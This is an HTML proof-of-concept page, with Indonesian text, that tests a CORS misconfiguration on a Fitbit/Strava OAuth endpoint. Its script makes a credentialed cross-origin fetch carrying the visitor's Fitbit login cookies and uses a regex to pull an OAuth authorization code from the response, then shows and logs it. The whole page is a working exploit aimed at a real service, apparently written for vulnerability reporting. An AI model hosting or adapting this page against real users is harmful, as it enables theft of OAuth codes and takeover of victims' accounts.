<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>PoC CORS Fitbit - Real Fetch</title>
  <style>
    body { font-family: sans-serif; padding: 20px; }
    #status { margin-top: 20px; font-weight: bold; }
  </style>
</head>
<body>
  <h2>Ambil kode OAuth dari strava.fitbit.com</h2>
  <div id="status">⏳ Sedang mencoba ambil kode...</div>

  <script>
    const url = "https://strava.fitbit.com/auth/fitbit";

    fetch(url, {
      method: "GET",
      credentials: "include", // Kirim cookie login Fitbit
      mode: "cors" // Biarkan kena rules CORS
    })
    .then(response => {
      if (!response.ok) {
        throw new Error("Respon error: " + response.status);
      }
      return response.text();
    })
    .then(html => {
      const match = html.match(/code=([a-zA-Z0-9\-_]+)/);
      if (match) {
        const code = match[1];
        document.getElementById("status").textContent = "✅ Kode berhasil diambil: " + code;
        console.log("✅ OAuth code ditemukan:", code);
      } else {
        document.getElementById("status").textContent = "⚠️ Tidak ditemukan kode dalam response.";
        console.log("Body tidak mengandung code= :", html);
      }
    })
    .catch(err => {
      document.getElementById("status").textContent = "❌ ERROR: " + err;
      console.error("Gagal ambil data:", err);
    });
  </script>
</body>
</html>

